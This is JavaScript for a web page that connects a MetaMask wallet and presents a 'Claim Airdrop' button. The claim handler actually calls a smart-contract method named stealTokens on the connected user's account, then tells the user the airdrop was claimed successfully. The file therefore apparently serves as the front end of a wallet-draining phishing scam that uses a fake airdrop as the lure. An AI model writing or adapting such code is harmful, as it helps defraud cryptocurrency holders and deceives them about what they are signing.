// Initialize accounts as an empty array to avoid undefined errors
let accounts = [];

// Function to connect the wallet and update accounts
async function connectWallet() {
    try {
        // Request accounts from MetaMask
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });

        // Now accounts is populated, enable the claim button
        console.log("Connected accounts:", accounts);

        const claimButton = document.getElementById('claimAirdropButton');
        claimButton.disabled = false; // Enable the button after wallet connection

    } catch (error) {
        console.error("Error connecting to wallet:", error);
        alert("Failed to connect to wallet. Please try again.");
    }
}

// Function to claim the airdrop
async function claimAirdrop() {
    // Check if accounts is properly initialized
    if (accounts.length === 0) {
        alert('Please connect to a wallet first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);

    try {
        console.log('Claiming airdrop...');
        // Use the first account in the accounts array
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Attach event listeners after DOM is loaded
window.addEventListener('DOMContentLoaded', () => {
    const connectButton = document.getElementById('connectButton'); // Replace with your connect button ID
    connectButton.addEventListener('click', connectWallet);

    const claimButton = document.getElementById('claimAirdropButton'); // Replace with your claim button ID
    claimButton.disabled = true; // Initially disable the claim button
    claimButton.addEventListener('click', claimAirdrop);
});


